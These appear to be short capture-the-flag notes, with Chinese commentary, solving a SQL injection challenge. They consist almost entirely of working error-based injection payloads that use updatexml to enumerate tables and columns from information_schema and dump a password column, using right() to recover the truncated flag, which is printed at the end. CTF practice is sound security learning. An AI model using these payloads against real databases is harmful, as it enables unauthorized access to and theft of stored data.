1'or(updatexml(1,concat(0x7e,select(group_concat(table_name)from(information_schema.tables)where(table_schema=database())),0x7e),1))#

1'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))#



admin'or(updatexml(1,concat(0x7e,

(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#



发现得到的flag不全





admin'or(updatexml(1,concat(0x7e,(select(group_concat('-',id,password))from(H4rDsq1)),0x7e),1))#
admin'or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#

这里用right来截取，拼接完之后 得到flag

4-ea8d-4b52-a067-f92e19d4f346}
12fcb4-ea8d-4b52-a067-f92e19d4f
flag{4612fcb4-ea8d-4b52-a067-f92e19d4f346} 
